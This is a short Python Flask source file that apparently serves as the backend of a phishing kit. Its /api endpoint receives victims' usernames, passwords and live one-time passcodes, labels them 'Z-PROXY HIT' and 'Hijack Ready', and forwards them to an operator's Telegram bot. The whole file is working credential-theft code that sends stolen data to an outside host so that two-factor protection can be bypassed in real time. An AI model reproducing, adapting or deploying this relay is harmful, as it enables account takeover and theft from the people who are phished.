from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

# Environment Variables
TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

@app.route('/api', methods=['POST'])
def middleman():
    try:
        data = request.get_json(force=True)
        user = data.get('u')
        dtype = data.get('type')
        
        msg = f"🥷 **Z-PROXY HIT**\n\n👤 User: `{user}`\n"
        
        if dtype == 'OTP_LIVE':
            msg += f"🔢 **LIVE OTP:** `{data.get('o')}`\n🔥 Status: Hijack Ready"
        else:
            msg += f"🔑 **Pass:** `{data.get('p')}`\n📊 **Attempt:** {dtype}"

        # Telegram Call
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
        return jsonify({"status": "received"})
    except:
        return jsonify({"status": "error"}), 500

def handler(req, res):
    return app(req, res)
    
